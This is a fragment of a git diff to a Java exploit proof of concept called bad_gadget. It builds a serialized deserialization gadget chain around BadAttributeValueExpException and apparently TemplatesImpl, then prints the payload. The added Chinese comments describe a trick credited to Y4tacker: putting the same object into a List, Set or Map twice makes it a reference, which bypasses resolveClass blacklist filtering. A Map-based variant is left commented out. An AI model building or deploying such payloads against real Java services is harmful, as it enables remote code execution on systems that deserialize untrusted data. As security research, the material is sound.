@@ -14,6 +14,15 @@ import java.util.ArrayList;
 import java.util.Base64;
 import java.util.HashMap;
 
+/**
+ *    Y4tacker原生反序列化2
+ *    向List、set、map类型中添加同样对象，都可以作为引用类型绕过resolveClass
+ *
+ */
+
+
+
+
 public class bad_gadget {
     public static void main(String[] args) throws Exception {
         ArrayList<Object> list = new ArrayList<>();
@@ -36,7 +45,14 @@ public class bad_gadget {
         Field val = Class.forName("javax.management.BadAttributeValueExpException").getDeclaredField("val");
         val.setAccessible(true);
         val.set(exp,jo);
+        // 第二次添加
         list.add(exp);
+
+//        也可以使用Map
+//        HashMap hashMap = new HashMap();
+//        hashMap.put(templates,bd);
+
+        
         System.out.println(serial(list));
     }
 
